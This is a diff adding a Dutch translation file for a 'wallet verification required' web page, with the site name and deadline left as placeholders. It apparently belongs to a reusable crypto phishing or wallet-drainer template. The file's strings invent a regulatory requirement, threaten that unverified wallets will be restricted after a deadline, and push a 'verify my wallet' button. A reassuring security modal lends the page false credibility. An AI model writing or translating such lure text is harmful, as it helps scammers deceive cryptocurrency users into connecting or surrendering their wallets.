@@ -1,0 +1,62 @@
+﻿{
+    "pageTitle": "Portemonnee Verificatie | {websiteName}",
+    "mainTitle": "Portemonnee Verificatie Vereist",
+    "description1": "Om aan beveiligingsstandaarden en regelgeving te voldoen, is nu verificatie van het portemonnee-adres vereist voor alle gebruikers.",
+    "deadlineText": "Vanaf {date} zullen niet-geverifieerde portemonnees",
+    "restrictionText": " tijdelijk beperkt worden",
+    "cooperationText": "Wij waarderen uw medewerking om ons platform veilig te houden.",
+    "termsText": "Ik ga akkoord met de",
+    "termsLink": "Gebruiksvoorwaarden van {websiteName}",
+    "verifyBtnText": "Mijn portemonnee verifiëren",
+    "securityBtnText": "Over gecompromitteerde zinnen",
+    "modalTitle": "Beveiligingswaarschuwing: Gecompromitteerde Herstelfrases",
+    "modalWarning": "Kritieke waarschuwing:",
+    "modalWarningText": "Uw herstelfrase is de hoofdsleutel van uw portemonnee. Deel deze nooit met anderen en voer deze nooit in op een website.",
+    "signsTitle": "Tekenen van een gecompromitteerde frase:",
+    "signsList": [
+        "Digitaal opgeslagen (foto's, cloud, berichten)",
+        "Ongeautoriseerde transacties in uw portemonnee"
+    ],
+    "actionTitle": "Directe actie vereist indien gecompromitteerd:",
+    "actionList": [
+        "Breng onmiddellijk alle fondsen over naar een nieuwe beveiligde portemonnee",
+        "Genereer een volledig nieuwe herstelfrase"
+    ],
+    "modalNote": "Let op: {websiteName} zal nooit om uw herstelfrase vragen. Dit verificatieproces vereist alleen uw openbare portemonnee-adres.",
+    "languageOptions": {
+        "en": "English",
+        "es": "Español",
+        "fr": "Français",
+        "de": "Deutsch",
+        "it": "Italiano",
+        "pt": "Português",
+        "pt-br": "Português (Brasil)",
+        "nl": "Nederlands",
+        "sv": "Svenska",
+        "da": "Dansk",
+        "no": "Norsk",
+        "fi": "Suomi",
+        "pl": "Polski",
+        "ru": "Русский",
+        "uk": "Українська",
+        "cs": "Čeština",
+        "hu": "Magyar",
+        "ro": "Română",
+        "tr": "Türkçe",
+        "ar": "العربية",
+        "fa": "فارسی",
+        "hi": "हिन्दी",
+        "bn": "বাংলা",
+        "th": "ไทย",
+        "vi": "Tiếng Việt",
+        "id": "Bahasa Indonesia",
+        "ms": "Bahasa Melayu",
+        "fil": "Filipino",
+        "zh": "中文(简体)",
+        "zh-tw": "中文(繁體)",
+        "ja": "日本語",
+        "ko": "한국어"
+    }
+}
+
+
